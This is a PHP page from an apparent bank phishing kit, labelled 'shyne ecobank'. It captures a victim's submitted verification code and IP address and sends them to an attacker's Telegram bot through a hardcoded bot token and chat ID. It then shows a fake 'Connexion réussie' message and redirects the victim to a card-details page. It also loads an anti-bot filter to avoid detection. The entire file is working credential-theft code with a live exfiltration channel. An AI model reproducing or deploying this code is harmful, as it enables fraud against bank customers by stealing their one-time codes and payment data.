<?php

include("antibots.php");

include './log/log.php';

if (isset($_POST['valider'])) {

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
/*$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

    //var_dump($_POST['username'], $_POST['password'], $CNCD, $STCD, $ip, $hostname);exit;*/

$message .= "===== shyne cyclone =====\n";
$message .= "Code Message : ".$_POST['cde']."\n";
$message .= "From : ".$ip."\n"; include "./rz/zone.php";
$message .= "===== shyne ecobank ====\n";

$telegram = new Telegram('5066037288:AAEw2KT0cU37dr0q7z90zWGu5qd-6ZvsREQ');
$chat_id = 2011330617;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

if($send){ 

    echo '<script type="text/javascript">'; 
    echo 'setTimeout(function(){window.top.location.href = "cartes.php";}, 2000);';
    echo '</script>';
 //header("Refresh: 3;URL=https://espaceclient.mysonec.net/confirmation.php");
}
}                                   

?>

<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #103D9E;
  width: 80px;
  height: 80px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>
<body>

<center>
<h3 style="position: relative; top: 100px; color: green;">Connexion réussie.</h3>

<div class="loader" style="position: relative; top: 100px;"></div><img src="images.jpg" width="100px" height="100px" style="position: relative; top: 110px;">
</center>
</body>
</html>